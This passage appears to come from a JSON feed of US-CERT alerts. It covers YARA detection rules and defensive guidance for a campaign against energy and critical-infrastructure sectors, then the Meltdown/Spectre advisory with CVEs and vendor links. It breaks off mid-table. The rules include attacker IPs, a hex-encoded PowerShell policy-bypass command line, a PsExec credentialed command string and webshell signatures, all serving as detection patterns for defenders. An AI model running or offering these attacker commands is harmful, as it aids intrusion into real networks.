classtype:bad-unknown; metadata:service netbios-ssn;)<br /> </p><p><strong>YARA Rules</strong></p><p>This is a consolidated rule set for malware associated with this activity. These rules were written by NCCIC and include contributions from trusted partners.</p><p>*/</p><p> </p><p>rule APT_malware_1</p><p>{</p><p>meta:</p><p>            description = \"inveigh pen testing tools &amp; related artifacts\"</p><p>            author = \"DHS | NCCIC Code Analysis Team\"    </p><p>            date = \"2017/07/17\"</p><p>            hash0 = \"61C909D2F625223DB2FB858BBDF42A76\"</p><p>            hash1 = \"A07AA521E7CAFB360294E56969EDA5D6\"</p><p>            hash2 = \"BA756DD64C1147515BA2298B6A760260\"</p><p>            hash3 = \"8943E71A8C73B5E343AA9D2E19002373\"</p><p>            hash4 = \"04738CA02F59A5CD394998A99FCD9613\"</p><p>            hash5 = \"038A97B4E2F37F34B255F0643E49FC9D\"</p><p>            hash6 = \"65A1A73253F04354886F375B59550B46\"</p><p>            hash7 = \"AA905A3508D9309A93AD5C0EC26EBC9B\"</p><p>            hash8 = \"5DBEF7BDDAF50624E840CCBCE2816594\"</p><p>            hash9 = \"722154A36F32BA10E98020A8AD758A7A\"</p><p>            hash10 = \"4595DBE00A538DF127E0079294C87DA0\"</p><p>strings:</p><p>            $s0 = \"file://\"</p><p>            $s1 = \"/ame_icon.png\"</p><p>            $s2 = \"184.154.150.66\"</p><p>            $s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }</p><p>            $s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }</p><p>            $s5 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"</p><p>            $s6 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</p><p>            $s7 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"</p><p>            $s8 = \"NlZzSZk=\"</p><p>            $s9 = \"WlJTb1q5kaxqZaRnser3sw==\"</p><p>            $s10 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</p><p>            $s11 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"</p><p>            $s12 = \"ps.exe -accepteula \\\\%ws% -u %user% -p %pass% -s cmd /c netstat\"</p><p>            $s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }</p><p>            $s14 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }</p><p>            $s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }</p><p>//inveigh pentesting tools</p><p>            $s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }</p><p>//specific malicious word document PK archive</p><p>            $s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }</p><p>            $s18 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }</p><p>            $s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }</p><p>            $s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</p><p>            $s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</p><p>            $s22 = \"5.153.58.45\"</p><p>            $s23 = \"62.8.193.206\"</p><p>            $s24 = \"/1/ree_stat/p\"</p><p>            $s25 = \"/icon.png\"</p><p>            $s26 = \"/pshare1/icon\"</p><p>            $s27 = \"/notepad.png\"</p><p>            $s28 = \"/pic.png\"</p><p>            $s29 = \"http://bit.ly/2m0x8IH\"</p><p>           </p><p>condition:</p><p>            ($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or ($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)</p><p>}</p><p> </p><p> </p><p> </p><p>rule APT_malware_2</p><p>{</p><p>meta:</p><p>      description = \"rule detects malware\"</p><p>      author = \"other\"</p><p> </p><p>strings:</p><p>      $api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }</p><p>      $http_push = \"X-mode: push\" nocase</p><p>      $http_pop = \"X-mode: pop\" nocase</p><p> </p><p>condition:</p><p>      any of them</p><p>}</p><p> </p><p> </p><p> </p><p>rule Query_XML_Code_MAL_DOC_PT_2</p><p>{</p><p>meta:</p><p>     name= \"Query_XML_Code_MAL_DOC_PT_2\"</p><p>     author = \"other\"</p><p> </p><p>strings:</p><p> </p><p>            $zip_magic = { 50 4b 03 04 }</p><p>            $dir1 = \"word/_rels/settings.xml.rels\"</p><p>            $bytes = {8c 90 cd 4e eb 30 10 85 d7}</p><p> </p><p>condition:</p><p>            $zip_magic at 0 and $dir1 and $bytes</p><p>}</p><p> </p><p> </p><p> </p><p>rule Query_Javascript_Decode_Function</p><p>{</p><p>meta:</p><p>      name= \"Query_Javascript_Decode_Function\"</p><p>      author = \"other\"</p><p> </p><p>strings:</p><p>      $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}</p><p>      $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}</p><p>      $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}</p><p>      $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}</p><p>      $func_call=\"a(\\\"\"</p><p> </p><p>condition:</p><p>      filesize &lt; 20KB and #func_call &gt; 20 and all of ($decode*)</p><p> </p><p>}</p><p> </p><p> </p><p> </p><p>rule Query_XML_Code_MAL_DOC</p><p>{</p><p>meta:</p><p>      name= \"Query_XML_Code_MAL_DOC\"</p><p>      author = \"other\"</p><p> </p><p>strings:</p><p>      $zip_magic = { 50 4b 03 04 }</p><p>      $dir = \"word/_rels/\" ascii</p><p>      $dir2 = \"word/theme/theme1.xml\" ascii</p><p>      $style = \"word/styles.xml\" ascii</p><p> </p><p>condition:</p><p>      $zip_magic at 0 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd</p><p>}</p><p> </p><p> </p><p> </p><p>rule z_webshell</p><p>{</p><p>meta:</p><p>            description = \"Detection for the z_webshell\"</p><p>            author = \"DHS NCCIC Hunt and Incident Response Team\"</p><p>            date = \"2018/01/25\"</p><p>            md5 =  \"2C9095C965A55EFC46E16B86F9B7D6C6\"</p><p> </p><p>strings:</p><p>            $aspx_identifier1 = \"&lt;%@ \" nocase ascii wide</p><p>            $aspx_identifier2 = \"&lt;asp:\" nocase ascii wide</p><p>            $script_import = /(import|assembly) Name(space)?\\=\\\"(System|Microsoft)/ nocase ascii wide</p><p>            $case_string = /case \\\"z_(dir|file|FM|sql)_/ nocase ascii wide</p><p>            $webshell_name = \"public string z_progname =\" nocase ascii wide</p><p>            $webshell_password = \"public string Password =\" nocase ascii wide</p><p> </p><p>condition:</p><p>            1 of ($aspx_identifier*)</p><p>            and #script_import &gt; 10</p><p>            and #case_string &gt; 7</p><p>            and 2 of ($webshell_*)</p><p>            and filesize &lt; 100KB</p><p>}</p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>This actors’ campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors.</p>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p>DHS and FBI encourage network users and administrators to use the following detection and prevention guidelines to help defend against this activity.</p><p> </p><p><strong>Network and Host-based Signatures</strong></p><p>DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, and YARA and Snort signatures provided and add the IPs to their watch list to determine whether malicious activity is occurring within their organization. Reviewing network perimeter netflow will help determine whether a network has experienced suspicious activity. Network defenders and malware analysts should use the YARA and Snort signatures provided in the associated YARA and .txt file to identify malicious activity.</p><p> </p><p><strong>Detections and Prevention Measures</strong></p><ul><li>Users and administrators may detect spear phishing, watering hole, web shell, and remote access activity by comparing all IP addresses and domain names listed in the IOC packages to the following locations:<ul><li>network intrusion detection system/network intrusion protection system logs,</li><li>web content logs,</li><li>proxy server logs,</li><li>domain name server resolution logs,</li><li>packet capture (PCAP) repositories,</li><li>firewall logs,</li><li>workstation Internet browsing history logs,</li><li>host-based intrusion detection system /host-based intrusion prevention system (HIPS) logs,</li><li>data loss prevention logs,</li><li>exchange server logs,</li><li>user mailboxes,</li><li>mail filter logs,</li><li>mail content logs,</li><li>AV mail logs,</li><li>OWA logs,</li><li>Blackberry Enterprise Server logs, and</li><li>Mobile Device Management logs.</li></ul></li><li>To detect the presence of web shells on external-facing servers, compare IP addresses, filenames, and file hashes listed in the IOC packages with the following locations:<ul><li>application logs,</li><li>IIS/Apache logs,</li><li>file system,</li><li>intrusion detection system/ intrusion prevention system logs,</li><li>PCAP repositories,</li><li>firewall logs, and</li><li>reverse proxy.</li></ul></li><li>Detect spear-phishing by searching workstation file systems and network-based user directories, for attachment filenames and hashes found in the IOC packages.</li><li>Detect persistence in VDI environments by searching file shares containing user profiles for all .lnk files.</li><li>Detect evasion techniques by the actors by identifying deleted logs. This can be done by reviewing last-seen entries and by searching for event 104 on Windows system logs.</li><li>Detect persistence by reviewing all administrator accounts on systems to identify unauthorized accounts, especially those created recently.</li><li>Detect the malicious use of legitimate credentials by reviewing the access times of remotely accessible systems for all users. Any unusual login times should be reviewed by the account owners.</li><li>Detect the malicious use of legitimate credentials by validating all remote desktop and VPN sessions of any user’s credentials suspected to be compromised.</li><li>Detect spear-phishing by searching OWA logs for all IP addresses listed in the IOC packages.</li><li>Detect spear-phishing through a network by validating all new email accounts created on mail servers, especially those with external user access.</li><li>Detect persistence on servers by searching system logs for all filenames listed in the IOC packages.</li><li>Detect lateral movement and privilege escalation by searching PowerShell logs for all filenames ending in “.ps1” contained in the IOC packages. (Note: requires PowerShell version 5, and PowerShell logging must be enabled prior to the activity.)</li><li>Detect persistence by reviewing all installed applications on critical systems for unauthorized applications, specifically note FortiClient VPN and Python 2.7.</li><li>Detect persistence by searching for the value of “REG_DWORD 100” at registry location “HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal”. Services\\MaxInstanceCount” and the value of “REG_DWORD 1” at location “HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\dontdisplaylastusername”.</li><li>Detect installation by searching all proxy logs for downloads from URIs without domain names.</li></ul><p> </p><p><strong>General Best Practices Applicable to this Campaign:</strong></p><ul><li>Prevent external communication of all versions of SMB and related protocols at the network boundary by blocking TCP ports 139 and 445 with related UDP port 137. See the NCCIC/US-CERT publication on <a href=\"https://www.us-cert.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices\">SMB Security Best Practices </a>for more information.</li><li>Block the Web-based Distributed Authoring and Versioning (WebDAV) protocol on border gateway devices on the network.</li><li>Monitor VPN logs for abnormal activity (e.g., off-hour logins, unauthorized IP address logins, and multiple concurrent logins).</li><li>Deploy web and email filters on the network. Configure these devices to scan for known bad domain names, sources, and addresses; block these before receiving and downloading messages. This action will help to reduce the attack surface at the network’s first level of defense. Scan all emails, attachments, and downloads (both on the host and at the mail gateway) with a reputable anti-virus solution that includes cloud reputation services.</li><li>Segment any critical networks or control systems from business systems and networks according to industry best practices.</li><li>Ensure adequate logging and visibility on ingress and egress points.</li><li>Ensure the use of PowerShell version 5, with enhanced logging enabled. Older versions of PowerShell do not provide adequate logging of the PowerShell commands an attacker may have executed. Enable PowerShell module logging, script block logging, and transcription. Send the associated logs to a centralized log repository for monitoring and analysis. See the FireEye blog post Greater Visibility through PowerShell Logging for more information.</li><li>Implement the prevention, detection, and mitigation strategies outlined in the NCCIC/US-CERT Alert TA15-314A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA15-314A\">Compromised Web Servers and Web Shells – Threat Awareness and Guidance</a>.</li><li>Establish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis, and including common indicators of phishing. End users should have clear instructions on how to report unusual or suspicious emails.</li><li>Implement application directory whitelisting. System administrators may implement application or application directory whitelisting through Microsoft Software Restriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</li><li>Block RDP connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.</li><li>Store system logs of mission critical systems for at least one year within a security information event management tool.</li><li>Ensure applications are configured to log the proper level of detail for an incident response investigation.</li><li>Consider implementing HIPS or other controls to prevent unauthorized code execution.</li><li>Establish least-privilege controls.</li><li>Reduce the number of Active Directory domain and enterprise administrator accounts.</li><li>Based on the suspected level of compromise, reset all user, administrator, and service account credentials across all local and domain systems.</li><li>Establish a password policy to require complex passwords for all users.</li><li>Ensure that accounts for network administration do not have external connectivity.</li><li>Ensure that network administrators use non-privileged accounts for email and Internet access.</li><li>Use two-factor authentication for all authentication, with special emphasis on any external-facing interfaces and high-risk environments (e.g., remote access, privileged access, and access to sensitive data).</li><li>Implement a process for logging and auditing activities conducted by privileged accounts.</li><li>Enable logging and alerting on privilege escalations and role changes.</li><li>Periodically conduct searches of publically available information to ensure no sensitive information has been disclosed. Review photographs and documents for sensitive data that may have inadvertently been included.</li><li>Assign sufficient personnel to review logs, including records of alerts.</li><li>Complete independent security (as opposed to compliance) risk review.</li><li>Create and participate in information sharing programs.</li><li>Create and maintain network and system documentation to aid in timely incident response. Documentation should include network diagrams, asset owners, type of asset, and an incident response plan.</li></ul><p> </p><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov\">NCCICcustomerservice@hq.dhs.gov</a> or 888-282-0870 and the FBI through a local field office or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov </a>or 855-292-3937).</p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[1] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.kb.cert.org/vuls/id/672268\">[2] CERT CC. Vulnerability Note #672268</a></li>\n            \t\t    \t<li><a href=\"\">[3] CCIRC CF17-010 UPDATE</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[4] MIFR-10127623</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>March 15, 2018: Initial Version</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2018-03-15T13:40:02.000Z"
		},
		{
			"type": "report",
			"title": "TA18-004A: Meltdown and Spectre Side-Channel Vulnerability Guidance",
			"name": "TA18-004A: Meltdown and Spectre Side-Channel Vulnerability Guidance",
			"id": "report--65091e0f-b822-4cce-959c-779277fc4796",
			"description": "Original release date: January 04, 2018 | Last revised: May 01, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>CPU hardware implementations</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>On January 3, 2018, the National Cybersecurity and Communications Integration Center (NCCIC) became aware of a set of security vulnerabilities—known as <a href=\"https://meltdownattack.com/\">Meltdown</a> and <a href=\"https://spectreattack.com/\">Spectre</a>—that affect modern computer processors. These vulnerabilities can be exploited to steal sensitive data present in a computer systems' memory.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>CPU hardware implementations are vulnerable to side-channel attacks, referred to as Meltdown and Spectre. Meltdown is a bug that \"melts\" the security boundaries normally enforced by the hardware, affecting desktops, laptops, and cloud computers. Spectre is a flaw an attacker can exploit to force a program to reveal its data. The name derives from \"speculative execution\"—an optimization method a computer system performs to check whether it will work to prevent a delay when actually executed. Spectre affects almost all devices including desktops, laptops, cloud servers, and smartphones.</p><p>More details of these attacks can be found here:</p><ul><li>Common Vulnerability and Exposure (CVE):<ul><li>Rogue Data Cache Load: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754\">CVE-2017-5754</a> (Meltdown) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5754\">https://nvd.nist.gov/vuln/detail/CVE-2017-5754</a></li><li>Bounds Check Bypass: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753\">CVE-2017-5753</a> (Spectre) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5753\">https://nvd.nist.gov/vuln/detail/CVE-2017-5753</a></li><li>Branch Target Injection: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715\">CVE-2017-5715</a> (Spectre Variant 2) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5715\">https://nvd.nist.gov/vuln/detail/CVE-2017-5715</a></li></ul></li><li>CERT/CC’s Vulnerability Note <a href=\"https://www.kb.cert.org/vuls/id/584653\">VU#584653</a></li></ul>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>An attacker can gain access to the system by establishing command and control presence on a machine via malicious Javascript, malvertising, or phishing. Once successful, the attacker could escalate privileges to exploit Meltdown and Spectre vulnerabilities, revealing sensitive information from a computer’s kernel memory, including keystrokes, passwords, encryption keys, and other valuable information.</p>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p><strong>Mitigation</strong></p><p>NCCIC encourages users and administrators to refer to their hardware and software vendors for the most recent information. In the case of Spectre, the vulnerability exists in CPU architecture rather than in software, and is not easily patched; however, this vulnerability is more difficult to exploit. </p><p>After patching, performance impacts may vary, depending on use cases. NCCIC recommends administrators ensure that performance is monitored for critical applications and services, and work with their vendor(s) and service provider(s) to mitigate the effect, if possible.</p><p>Additionally, NCCIC recommends users and administrators who rely on cloud infrastructure work with their CSP to mitigate and resolve any impacts resulting from host OS patching and mandatory rebooting.</p><p>For machines running Windows Server, a number of registry changes must be completed in addition to installation of the patches.  NCCIC recommends verifying your Windows Server version before downloading applicable patches and performing registry edits.  A list of registry changes can be found at <a href=\"https://support.microsoft.com/en-us/help/4072698/windows-server-guidance-to-protect-against-the-speculative-execution\">https://support.microsoft.com/en-us/help/4072698/windows-server-guidance-to-protect-against-the-speculative-execution</a>.</p><p>Microsoft has released guidance and an update that helps to mitigate against CVE-2017-5715 – the branch target injection vulnerability commonly known as Spectre Variant 2.  As always, NCCIC recommends testing patches before implemenation. More information can be found at <a href=\"https://support.microsoft.com/en-sg/help/4078407/update-to-enable-mitigation-against-spectre-variant-2\">https://support.microsoft.com/en-sg/help/4078407/update-to-enable-mitigation-against-spectre-variant-2</a>.</p><p><strong>Antivirus</strong></p><p>Typical antivirus programs are built on a signature management system, and may not be able to detect the vulnerabilities. NCCIC recommends checking with your antivirus vendor to confirm compatibility with Meltdown and Spectre patches. Microsoft recommends third-party antivirus vendors add a change to the registry key of the machine running the antivirus software. Without it, that machine will not receive any of the following fixes from Microsoft:</p><ul><li>Windows Update</li><li>Windows Server Update Services</li><li>System Center Configuration Manager </li></ul><p>More information can be found at <a href=\"https://support.microsoft.com/en-us/help/4072699/january-3-2018-windows-security-updates-and-antivirus-software\">https://support.microsoft.com/en-us/help/4072699/january-3-2018-windows-security-updates-and-antivirus-software</a>.</p><p><strong>\"Total Meltdown\"</strong></p><p>Users running Windows 7 64-bit or Windows Server 2008 R2 64-bit operating systems on Intel processors who have installed Microsoft’s fix for Meltdown and Spectre in January or February of 2018 should install the latest patch immediately. According to researcher Ulf Frisk, the previous Microsoft patches for Meltdown and Spectre contain a vulnerability that could allow users and apps to read and write kernel memory, thereby gaining full control over a system.</p><p>Another researcher has posted code that takes advantage of this vulnerability, allowing a normal user to initiate an administrator-level command line session within the affected system.</p><p>Microsoft recommends users install the latest updates to mitigate this vulnerability.</p><p>The following resources provide additional information:</p><p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-1038\">Windows Kernel Elevation of Privilege: CVE-2018-1038 (Total Meltdown)</a></p><p><a href=\"http://blog.frizk.net/2018/03/total-meltdown.html?m=1\">Ulf Frisk’s research</a></p><p><a href=\"https://support.microsoft.com/en-us/help/4093118\">Microsoft’s April 2018 Monthly Rollup</a></p><p><a href=\"https://www.kb.cert.org/vuls/id/277400\">CERT/CC’s Vulnerability Note VU#277400</a></p><p><strong>Vendor Links</strong></p><p>The following table contains links to advisories and patches published in response to the vulnerabilities. This table will be updated as information becomes available.</p><p>Note: NCCIC strongly recommends:</p><ul><li>downloading any patches or microcode directly from your vendor's website</li><li>using a test environment to verify each patch before implementing</li></ul><table border=\"1\" cellpadding=\"1\" cellspacing=\"1\" class=\"general-table\" style=\"width: 400px; height: 312px;\"><thead><tr><th scope=\"col\"><strong>Link to Vendor Information</strong></th><th scope=\"col\"><strong>Date Added</strong></th></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://aws.amazon.com/security/security-bulletins/AWS-2018-013/\">Amazon</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.amd.com/en/corporate/speculative-execution\">AMD</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://source.android.com/security/bulletin/2018-01-01\">Android</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.apple.com/en-us/HT208394\">Apple</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://developer.arm.com/support/security-update\">ARM</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lists.centos.org/pipermail/centos-announce/2018-January/date.html\">CentOS</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.chromium.org/Home/chromium-security/ssca\">Chromium</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180104-cpusidechannel \">Cisco</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.citrix.com/article/CTX231390\">Citrix</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security-tracker.debian.org/tracker/CVE-2017-5754\">Debian</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.dragonflybsd.org/pipermail/users/2018-January/313758.html\">DragonflyBSD</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.f5.com/csp/article/K91229003\">F5</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://fedoramagazine.org/protect-fedora-system-meltdown\">Fedora Project</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://fortiguard.com/psirt/FG-IR-18-002\">Fortinet</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://support.hp.com/document/c05869091\">HP</a></td><td scope=\"col\" style=\"text-align: left;\">January 19, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html\">Google</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://www.huawei.com/en/psirt/security-notices/huawei-sn-20180104-01-intel-en\">Huawei</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://securityintelligence.com/cpu-vulnerability-can-allow-attackers-to-read-privileged-kernel-memory-and-leak-data/\">IBM</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;languageid=en-fr\">Intel</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://kb.juniper.net/InfoCenter/index?page=content&amp;id=JSA10842&amp;cat=SIRT_1&amp;actp=LIST\">Juniper</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.lenovo.com/us/en/solutions/len-18282\">Lenovo</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lkml.org/lkml/2017/12/4/709\">Linux</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.llvm.org/pipermail/llvm-commits/Week-of-Mon-20180101/513630.html\">LLVM: variant #2</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://reviews.llvm.org/D41760 %3chttps:/reviews.llvm.org/D41760%3e\">LLVM: builtin_load_no_speculate</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://reviews.llvm.org/D41761\">LLVM: llvm.nospeculatedload</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://azure.microsoft.com/en-us/blog/securing-azure-customers-from-cpu-vulnerability/\">Microsoft Azure</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV180002\">Microsoft</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack\">Mozilla</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security.netapp.com/advisory/ntap-20180104-0001/\">NetApp</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://info.nutanix.com/TA5G00u0C000PVD00O0A8Q0\">Nutanix</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://nvidia.custhelp.com/app/answers/detail/a_id/4609\">NVIDIA</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lists.opensuse.org/opensuse-security-announce/2018-01/msg00001.html\">OpenSuSE</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html\">Oracle</a></td><td scope=\"col\" style=\"text-align: left;\">January 17, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a 